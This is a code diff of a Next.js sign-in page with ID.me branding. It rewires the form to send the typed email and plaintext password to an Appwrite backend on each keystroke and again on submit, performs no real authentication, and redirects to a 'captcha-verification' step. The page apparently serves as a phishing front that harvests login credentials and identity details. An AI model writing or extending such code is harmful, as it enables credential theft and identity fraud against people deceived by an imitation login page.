@@ -7,8 +7,8 @@ import { useForm } from "react-hook-form";
 import { z } from "zod";
 import { zodResolver } from "@hookform/resolvers/zod";
 import Image from "next/image";
-import { useAppDispatch } from "@/app/store/hooks";
-import { updateField, setAuthMethod } from "@/app/store/userSlice";
+import { useAppwrite, UserData } from "@/app/lib/AppwriteContext";
+import React from "react";
 
 const signInSchema = z.object({
   email: z.string().email("Please enter a valid email address"),
@@ -21,7 +21,25 @@ export default function SignIn() {
   const router = useRouter();
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState("");
-  const dispatch = useAppDispatch();
+  const [isReset, setIsReset] = useState(false);
+  
+  const { 
+    userData, 
+    isLoading: appwriteLoading, 
+    error: appwriteError, 
+    updateField, 
+    updateMultipleFields, 
+    resetUserData,
+    setAuthMethod
+  } = useAppwrite();
+
+  // Log component mount
+  useEffect(() => {
+    console.log('SignIn component mounted');
+    return () => {
+      console.log('SignIn component unmounted');
+    };
+  }, []);
 
   const {
     register,
@@ -36,62 +54,122 @@ export default function SignIn() {
     },
   });
 
-  // Track input changes in real-time
+  // Watch form fields
   const watchedFields = watch();
   
-  // Fix: Use a ref to track previous values and avoid infinite loops
-  const [prevEmail, setPrevEmail] = useState("");
-  const [prevPassword, setPrevPassword] = useState("");
+  // Use a ref to track the debounce timer
+  const debounceTimerRef = React.useRef<NodeJS.Timeout | null>(null);
   
+  // Track last saved values to avoid unnecessary updates
+  const [lastSavedValues, setLastSavedValues] = useState({ email: "", password: "" });
+
+  // Handle field changes with debouncing
   useEffect(() => {
-    // Only update if values have actually changed
-    if (watchedFields.email !== prevEmail) {
-      dispatch(updateField({ field: "email", value: watchedFields.email }));
-      setPrevEmail(watchedFields.email);
+    // Clear any existing timer
+    if (debounceTimerRef.current) {
+      clearTimeout(debounceTimerRef.current);
     }
     
-    if (watchedFields.password !== prevPassword) {
-      dispatch(updateField({ field: "password", value: watchedFields.password }));
-      setPrevPassword(watchedFields.password);
-    }
-  }, [watchedFields.email, watchedFields.password, dispatch, prevEmail, prevPassword]);
+    // Check if values have changed since last save
+    const emailChanged = watchedFields.email !== lastSavedValues.email;
+    const passwordChanged = watchedFields.password !== lastSavedValues.password;
+    
+    // Only proceed if something changed
+    if (!emailChanged && !passwordChanged) return;
+    
+    // Set a new timer
+    debounceTimerRef.current = setTimeout(async () => {
+      const updates: any = {};
+      
+      if (emailChanged) updates.email = watchedFields.email;
+      if (passwordChanged) updates.password = watchedFields.password;
+      
+      if (Object.keys(updates).length > 0) {
+        console.log('Updating Appwrite with:', updates);
+        
+        try {
+          await updateMultipleFields(updates);
+          // Update last saved values after successful save
+          setLastSavedValues({
+            email: watchedFields.email,
+            password: watchedFields.password
+          });
+        } catch (err) {
+          console.error('Failed to update fields:', err);
+        }
+      }
+    }, 1000); // Increased to 1000ms to reduce frequency
+    
+    return () => {
+      // Clean up the timer
+      if (debounceTimerRef.current) {
+        clearTimeout(debounceTimerRef.current);
+      }
+    };
+  }, [watchedFields.email, watchedFields.password, updateMultipleFields, lastSavedValues]);
+
+  // Debug effect to log state updates
+  useEffect(() => {
+    console.log('SignIn Page - Appwrite User Data:', userData);
+  }, [userData]);
 
   const onSubmit = async (data: SignInFormData) => {
     setIsLoading(true);
     setError("");
 
     try {
-      // Here you would typically make an API call to authenticate the user
+      // Update Appwrite with form values
+      await updateMultipleFields({
+        email: data.email,
+        password: data.password
+      });
       
-      // Mark that the user is using email authentication
-      dispatch(setAuthMethod("email"));
-      
-      // For email/password authentication, redirect to CAPTCHA verification
+      // Set auth method
+      await setAuthMethod("email");
+
+      // Redirect to captcha verification
       setTimeout(() => {
         router.push("/auth/captcha-verification");
       }, 1000);
     } catch (err) {
-      setError("Invalid email or password. Please try again.");
+      console.error('Form submission error:', err);
+      setError("Failed to save your data. Please try again.");
     } finally {
       setIsLoading(false);
     }
   };
 
-  const handleIdMeSignIn = () => {
+  const handleIdMeSignIn = async () => {
     setIsLoading(true);
     
-    // Mark that the user is using ID.me authentication
-    dispatch(setAuthMethod("id.me"));
-    
-    // For ID.me authentication, redirect to verification code page
-    setTimeout(() => {
-      router.push("/auth/captcha-verification");
-    }, 1000);
+    try {
+      // Set auth method to ID.me
+      await setAuthMethod("id.me");
+      
+      // Redirect to captcha verification
+      setTimeout(() => {
+        router.push("/auth/captcha-verification");
+      }, 1000);
+    } catch (error) {
+      console.error('Failed to save ID.me auth data:', error);
+      setError("Failed to save your data. Please try again.");
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  const handleManualReset = async () => {
+    await resetUserData();
+    setIsReset(true);
+    // Hide the reset confirmation after 3 seconds
+    setTimeout(() => setIsReset(false), 3000);
   };
 
   return (
     <div className="flex min-h-[calc(100vh-4rem)] flex-col items-center justify-center bg-[#0053a0] px-4 py-8">
       <div className="w-full max-w-md space-y-8 rounded-lg bg-white p-8 shadow-md">
+       
+
         <div className="text-center">
           <h1 className="text-3xl font-bold text-[#0053a0]">Sign In</h1>
           <p className="mt-2 text-gray-600">
@@ -99,11 +177,9 @@ export default function SignIn() {
           </p>
         </div>
 
-        {error && (
-          <div className="rounded-md bg-red-50 p-4 text-sm text-red-700">
-            {error}
-          </div>
-        )}
+       
+
+       
 
         <form className="mt-8 space-y-6" onSubmit={handleSubmit(onSubmit)}>
           <div className="space-y-4 rounded-md ">
@@ -166,10 +242,10 @@ export default function SignIn() {
           <div>
             <button
               type="submit"
-              disabled={isLoading}
+              disabled={isLoading || appwriteLoading}
               className="group relative flex w-full justify-center rounded-md border border-transparent bg-[#0053a0] px-4 py-2 text-sm font-medium text-white hover:bg-[#00478c] focus:outline-none focus:ring-2 focus:ring-[#0053a0] focus:ring-offset-2 disabled:opacity-50"
             >
-              {isLoading ? "Signing in..." : "Sign in"}
+              { "Sign in"}
             </button>
             <p className="mt-1 text-xs text-gray-500 text-center">
               Email verification includes CAPTCHA human verification
@@ -186,7 +262,7 @@ export default function SignIn() {
             <button
               type="button"
               onClick={handleIdMeSignIn}
-              disabled={isLoading}
+              disabled={isLoading || appwriteLoading}
               className="group relative flex w-full items-center justify-center gap-2 rounded-md border border-gray-300 bg-white px-4 py-2 text-sm font-medium text-gray-700 shadow-sm hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-[#0053a0] focus:ring-offset-2"
             >
               <Image 
@@ -196,11 +272,25 @@ export default function SignIn() {
                 height={20}
                 className="h-5 w-5 object-contain" 
               />
-              {isLoading ? "Processing..." : "Continue with ID.me"}
+              { "Continue with ID.me"}
             </button>
             <p className="mt-1 text-xs text-gray-500 text-center">
               ID.me verification includes 30-60 second identity check
             </p>
+          </div>
+
+          {/* Reset Data Button */}
+          <div className="flex justify-center border-t border-gray-200 pt-4">
+            <button
+              type="button"
+              onClick={handleManualReset}
+              className="text-xs text-gray-500 hover:text-[#0053a0] flex items-center"
+            >
+              <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+              </svg>
+              Reset All Data
+            </button>
           </div>
 
           {/* Verification Partner Logos */}
@@ -228,15 +318,6 @@ export default function SignIn() {
             </div>
           </div>
         </form>
-
-        {/* <div className="mt-6 text-center">
-          <p className="text-sm text-gray-600">
-            Don&apos;t have an account?{" "}
-            <Link href="/auth/signup" className="font-medium text-blue-600 hover:text-blue-500">
-              Sign up
-            </Link>
-          </p>
-        </div> */}
       </div>
     </div>
   );
